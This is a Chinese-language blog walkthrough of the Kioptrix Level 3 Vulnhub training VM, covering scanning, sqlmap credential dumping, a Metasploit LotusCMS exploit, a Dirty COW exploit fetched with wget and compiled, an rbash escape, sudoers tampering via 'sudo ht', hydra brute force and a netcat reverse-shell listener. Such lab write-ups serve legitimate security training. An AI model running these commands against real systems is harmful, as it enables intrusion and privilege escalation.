---
title: KIOPTRIX:LEVEL3  
date: 2024-01-27
categories: [Training platform,Vulnhub]  
tags: [Vulnhub,web]  
permalink: "/Vulnhub/Kioptrix-level3.html"
---

# KIOPTRIX:LEVEL3

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712002.png" alt="image-20240126163559667" style="zoom:50%;" />

挑战一下这个靶场：

扫描一下：

![image-20240126165501033](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712004.png)

打开看一下：

![image-20240126165554062](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712005.png)

到处点点，查看一下浏览器插件，看看配置信息：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712006.png" alt="image-20240126165732766" style="zoom:50%;" />

可以看到是一个`2.2.8的Apache`。然后发现了一个疑似`sql注入点`：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712007.png" alt="image-20240126173022142" style="zoom:50%;" />

## 尝试sql注入

尝试万能密码：

```shell
admin' or 1=1 --+
admin' or '1'='1 
```

不行，跑一下`sqlmap`:

![image-20240126180344471](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712008.png)

不行，跑不出来。。。他的意思大概是：

```text
这个报错信息表示sqlmap在测试所有参数时，没有发现任何可以注入的参数1234。这可能是由于以下原因：
测试的参数实际上不可注入。
测试的级别（--level）和风险（--risk）可能不够高，导致某些潜在的注入点没有被测试到。你可以尝试提高这两个选项的值来进行更多的测试。
如果你怀疑存在某种保护机制（例如WAF），你可以尝试使用--tamper选项（例如--tamper=space2comment）来绕过这些保护机制。
你也可以尝试切换--random-agent，这可能有助于绕过某些基于User-Agent的保护机制
```

这是初级靶场，感觉应该不是这个地方想让我们突破。

## 端口扫描

```shell
nmap -sn 192.168.244.1/24 --min-rate 8000 -r
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712009.png" alt="image-20240126170106220" style="zoom:50%;" />

这是探测靶场的存活性的，比较快，然后监测一下相关信息：

```shell
nmap -A 192.168.244.139 -oA scan_result
# 在Nmap命令中，-oA选项用于同时保存扫描结果到三种不同的文件格式：普通文本、XML和grepable
# 22/tcp open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
# 80/tcp open  http    Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
# Running: Linux 2.6.X
# OS CPE: cpe:/o:linux:linux_kernel:2.6
# OS details: Linux 2.6.9 - 2.6.33
# Network Distance: 1 hop
# Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

 还可以使用`rustscan`进行扫描，差生文具多，请容我再试试：

```shell
rustscan -a 192.168.244.139 -- -sV -oA scan
```

![image-20240126215504623](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712010.png)

本质上其实是一样的，监测以后发现开放了一个`22`端口，一个`80`端口，意味着我们可以进行 ssh 连接。

## 目录扫描

老样子，差生文具多，这里可以使用到的工具大概有`gobuster`，`dirb`，`dirsearch`，`Nikto`还有`feroxbuster`，我们先使用一下最后一个rust做出来的工具。

```shell
feroxbuster -u http://192.168.244.139/ -x* -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -d 2 -f -C 404 --no-state -o feroxbuster.txt
# -u, --url <URL>：要扫描的目标URL12。
# -x, --extensions <FILE_EXTENSION>...：要搜索的文件扩展名，例如php和html。
# -w, --wordlist <WORDLIST>：用于扫描的字典文件的路径。
# -t, --threads <THREADS>：并发线程数，此处为200。
# -d, --depth <DEPTH>：扫描的目录深度，此处为2。
# -f, --follow-redirects：跟随重定向。
# -C, --status-codes <STATUS_CODE>...：要报告的HTTP状态码，此处为404。
# --no-state：不保存扫描状态。
# -o, --output <OUTPUT>：输出文件的路径，此处为feroxbuster.txt。
```

再尝试一下`dirsearch`：

```shell
dirsearch -u http://192.168.244.139/ -e* -x 404,403 
```

![image-20240127101715532](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712011.png)

找到了一些`icons`，`gallery`，`cache`等文件，而且在 dirsearch 扫描结果中发现了`phpmyadmin`这个目录，这意味着我们可能可以进行利用。

## 踩点

发现了一个登录页面：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712012.png" alt="image-20240127102247501" style="zoom:50%;" />

看来我们的目的就明确了，寻找账号密码从这里进入，查看一下其他网站，看看有无注入点：

![image-20240127103144934](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712013.png)

在这里进行访问的时候发生了跳转，尝试将跳转的地址换为ip：

```text
http://kioptrix3.com/gallery/p.php/5     # 发生跳转
http://192.168.244.139/gallery/p.php/5   # 正常显示
```

![image-20240127103404728](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712014.png)

发现可以正常访问，修改一下host文件：

```shell
vim /etc/hosts
# 127.0.0.1       localhost
# 127.0.1.1       kali
# 192.168.144.139 kioptrix3.com
# ::1             localhost ip6-localhost ip6-loopback
# ff02::1         ip6-allnodes
# ff02::2         ip6-allrouters
```

然后进行访问，访问异常，清理一下缓存：

![image-20240127104115367](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712015.png)

然后再次打开，还是不行，尝试重启浏览器，刷新dns缓存：

```shell
sudo /etc/init.d/networking restart 
# service networking restart
```

发现还生效，ping一下发现地址是对的，但是丢包百分百。。。重启一下kali：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712016.png" alt="image-20240127111004218" style="zoom:50%;" />

还是不行。。。。尝试修改`/etc/hosts.conf`：

```shell
multi on -->   order hosts,bind
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712017.png" alt="image-20240127112327119" style="zoom:50%;" />

再次打开，我擦还是不行，经过我多番尝试，发现还是之前打的ip地址不对。。。。太粗心了。。。。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712018.png" alt="image-20240127112652710" style="zoom:50%;" />

修改以后打开：

![image-20240127112748607](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712019.png)

正常打开了，这可真是一个大乌龙。。。。

到处翻翻，发现了一个传get参数的页面：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712020.png" alt="image-20240127113100700" style="zoom:50%;" />

试探一下：

![image-20240127113134337](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712021.png)

找到一个注入点，sqlmap试试：

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1
```

![image-20240127113436671](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712022.png)

继续查看一下数据库

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --dbs
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712023.png" alt="image-20240127113647827" style="zoom:50%;" />

查看一下数据库中的表有些啥：

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --tables -D gallery
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --tables -D information_schema
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --tables -D mysql
```

<div align="center"><img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271142810.png" style="zoom:33%;"></div> 

<div align="center"><img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271718352.png" style="zoom:25%;"></div> 

<div align="center"><img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271146986.png" style="zoom:33%;"></div> 

接着往下查询：

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 --columns -D gallery
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712024.png" alt="image-20240127115401561" style="zoom:50%;" />

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712025.png" alt="image-20240127115416368" style="zoom:50%;" />

然后进一步查看一下相关信息：

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 –dump -D gallery -T dev_accounts -C “username,password”
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712026.png" alt="image-20240127115654542" style="zoom:50%;" />

```shell
sqlmap -u http://kioptrix3.com/gallery/gallery.php?id=1 –dump -D gallery -T gallarific_users -C “username,password”
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712027.png" alt="image-20240127115753785" style="zoom:50%;" />

使用上面两个账号`dreg`和`loneferret`可以进行ssh远程连接。

> 这里直接 ssh  username@IP会报错
>
> 报错是因为OpenSSH 7.0以后的版本不再支持ssh-dss (DSA)算法

```shell
ssh -oHostKeyAlgorithms=+ssh-dss dreg@192.168.244.139
ssh -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.244.139
# ssh：这是Secure Shell的缩写，是一种网络协议，用于在不安全的网络中提供安全的远程登录和其他安全网络服务。
# -oHostKeyAlgorithms=+ssh-dss：这是一个选项，用于指定在进行密钥交换时使用的主机密钥算法。
# 在这里，+ssh-dss表示添加ssh-dss算法到默认的主机密钥算法列表中。
```

获取普通用户权限。

## 尝试CMS漏洞

### Lotus CMS 漏洞利用

打开login网页的时候可发现是采用 Lotus CMS 的：

![image-20240126233322383](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712028.png)

尝试寻找一下相关漏洞：（这里直接使用metasploit是因为我之前已经在searchsploit里找到了这个利用点了）

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712029.png" alt="image-20240127164427260" style="zoom: 33%;" />

利用失败：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712030.png" alt="image-20240127164500015" style="zoom: 50%;" />

可能是因为这个payload原因，多试几个，``是可以的。

![image-20240127170953311](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712031.png)

总的流程是这样的：

```shell
msfconsole
search lotuscms
use exploit/multi/http/lcms_php_exec
# No payload configured, defaulting to php/meterpreter/reverse_tcp
show options
set RHOSTS 192.168.244.140
set URI "/"
show payloads 
set payload payload/generic/shell_bind_tcp
run # exploit
```

选出合适的，再次进行利用：

![image-20240127170238380](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712032.png)

这里参考了这位师傅的解答：https://zhuanlan.zhihu.com/p/654675099

这里我不是很清楚这个URI参数设置是干啥的，尝试去除：

![image-20240127171134660](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712033.png)

也可以正常利用，回头有时间再去学习一下！

## 提权

查找一下相关文件，看看有无我们需要的：

![image-20240127134710816](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712034.png)

找到了数据库的用户名密码：

![image-20240127134729841](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712035.png)

打开看一下，可以找到我们之前找到的：

![image-20240127135351182](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712036.png)



## 内核提权

查看一下内核版本和信息：

```shell
uname -a
# Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686 GNU/Linux
lsb_release -a
# No LSB modules are available.
# Distributor ID: Ubuntu
# Description:    Ubuntu 8.04.3 LTS
# Release:        8.04
# Codename:       hardy
cat /proc/version
# Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009
```

查到内核的版本了，搜索一下相关漏洞：

![image-20240127140832046](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712037.png)

尝试一下`Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation (/etc/passwd Method)                                                 | linux/local/40839.c`这个漏洞：

在本地打开一下python的简易http服务：

```shell
# local
python3 -m http.server 1234
# remote
wget http://192.168.244.133:1234/40839.c
gcc -pthread 40839.c -o 40839 -lcrypt
./40839 password
# 新用户密码，这里使用的是Mast3r，其实都行
```

![image-20240127141940821](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712038.png)

获取flag：

```shell
ls -lah /root/ 
cat /root/Congrats.txt
# 
Good for you for getting here.
Regardless of the matter (staying within the spirit of the game of course)
you got here, congratulations are in order. Wasn't that bad now was it.

Went in a different direction with this VM. Exploit based challenges are
nice. Helps workout that information gathering part, but sometimes we
need to get our hands dirty in other things as well.
Again, these VMs are beginner and not intented for everyone. 
Difficulty is relative, keep that in mind.

The object is to learn, do some research and have a little (legal)
fun in the process.

I hope you enjoyed this third challenge.

Steven McElrea
aka loneferret
http://www.kioptrix.com

Credit needs to be given to the creators of the gallery webapp and CMS used
for the building of the Kioptrix VM3 site.

Main page CMS: 
http://www.lotuscms.org

Gallery application: 
Gallarific 2.1 - Free Version released October 10, 2009
http://www.gallarific.com
Vulnerable version of this application can be downloaded
from the Exploit-DB website:
http://www.exploit-db.com/exploits/15891/

The HT Editor can be found here:
http://hte.sourceforge.net/downloads.html
And the vulnerable version on Exploit-DB here:
http://www.exploit-db.com/exploits/17083/
Also, all pictures were taken from Google Images, so being part of the
public domain I used them.
```

## SUID提权

先查找一下看看是否可以SUID提权：

``` shell
find / -perm -u=s -type f 2 > /dev/null
# find / -user root -perm -4000 -print 2>/dev/null
# find / -user root -perm -4000 -exec ls -ldb {} 
```

> 会报错：`-rbash: /dev/null: restricted: cannot redirect output`
>
> 这是因为 RBASH 是一种特殊的 shell，它限制了用户的一些操作和权限

尝试绕过一下，相关文章可以参考：[Linux提权之rbash绕过](https://www.freebuf.com/vuls/376922.html)

```shell
rbash$ ftp
ftp> !/bin/bash
```

再次查询一下相关的SUID权限文件：

```text
/usr/lib/eject/dmcrypt-get-device
/usr/lib/openssh/ssh-keysign
/usr/lib/apache2/suexec
/usr/lib/pt_chown
/usr/bin/arping
/usr/bin/mtr
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/gpasswd
/usr/bin/sudo
/usr/bin/at
/usr/bin/sudoedit
/usr/bin/chsh
/usr/bin/passwd
/usr/bin/traceroute6.iputils
/usr/local/bin/ht
/usr/sbin/pppd
/usr/sbin/uuidd
/lib/dhcp3-client/call-dhclient-script
/bin/fusermount
/bin/ping
/bin/mount
/bin/umount
/bin/ping6
/bin/su
```

这里没有看到常用的提权命令，原理可以参考这位师傅的文章：[谈一谈Linux与suid提权](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)，但是换了一个用户登录以后有个文件会提示ht可能可以利用，就是`/usr/local/bin/ht`，尝试搜索一下，找到了一个师傅的总结：[Linux通过第三方应用提权实战总结](https://www.freebuf.com/articles/system/261271.html)

```shell
┌──(kali㉿kali)-[~]
└─$ ssh -oHostKeyAlgorithms=+ssh-dss loneferret@192.168.244.139
loneferret@192.168.244.139's password: 
Linux Kioptrix3 2.6.24-24-server #1 SMP Tue Jul 7 20:21:17 UTC 2009 i686

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

To access official Ubuntu documentation, please visit:
http://help.ubuntu.com/
Last login: Sat Apr 16 08:51:58 2011 from 192.168.1.106
loneferret@Kioptrix3:~$ ls
checksec.sh  CompanyPolicy.README
loneferret@Kioptrix3:~$ cat CompanyPolicy.README 
Hello new employee,
It is company policy here to use our newly installed software for editing, creating and viewing files.
Please use the command 'sudo ht'.
Failure to do so will result in you immediate termination.

DG
CEO
```

然后我们尝试运行`sudo ht`，发现报错：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712039.png" alt="image-20240127143844572" style="zoom:50%;" />

上网查找相关资料，猜测是由于之前的内核提权脚本将root名字给覆盖了。。。重新下载一下靶场：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712040.png" alt="image-20240127145145148" style="zoom:50%;" />

成功了！

```shell
sudo -l # 查看权限
export TERM = xterm
sudo ht
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712041.png" alt="image-20240127145339345" style="zoom:50%;" />

按`F3`打开：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712042.png" alt="image-20240127145427375" style="zoom:33%;" />

输入`/etc/sudoers`:

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712043.png" alt="image-20240127145912303" style="zoom:50%;" />

进入以后修改为：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712044.png" alt="image-20240127150100766" style="zoom:50%;" />

这样无需密码即可完成所有操作，再按`F2`保存，`ctrl+z`退出。

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712046.png" alt="image-20240127150326239" style="zoom:50%;" />

拿到root。

## 一些尝试

在看其他师傅解决办法的过程中我发现了一些不一样的思路，在此进行记录：

### 爆破

https://www.c0dedead.io/kioptrix-level-3-walkthrough/

这个师傅发现了，新加入成员的姓名，于是进行了爆破：

![image-20240127151359965](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712047.png)

使用`hydra`爆破ssh的密码：

```shell
hydra -l loneferret -P /usr/share/wordlists/rockyou.txt 192.168.244.140 -t 4 ssh

```

这里如果报错就这么操作：

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712048.png" alt="image-20240127151607834" style="zoom:50%;" />

这是john自带字典，需要进行解压一下。

但是运行的时候还是发生了报错，意思是，我们客户端缺少相关的加密算法：

![image-20240127152059181](https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712049.png)

以后有机会再进行尝试吧，我在多个地方查看到这个问题的解决方式，均未解决。

### github搜索相关漏洞

https://infosecwriteups.com/vulnhub-kioptrix-level-3-1-2-3-a7ff58cbfb8f

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712050.png" alt="image-20240127155753171" style="zoom:50%;" />

这个感觉在 searchsploit 里见过，查了一下，又不太一样。。。

```shell
# 本地设置监听
nc -lvvp 1234
# 利用脚本
./lotusRCE.sh 192.168.244.140
```

<img src="https://pic-for-be.oss-cn-hangzhou.aliyuncs.com/img/202401271712051.png" alt="image-20240127163427351" style="zoom: 50%;" />

获得一个 www-data 的账号，继续尝试提权即可。

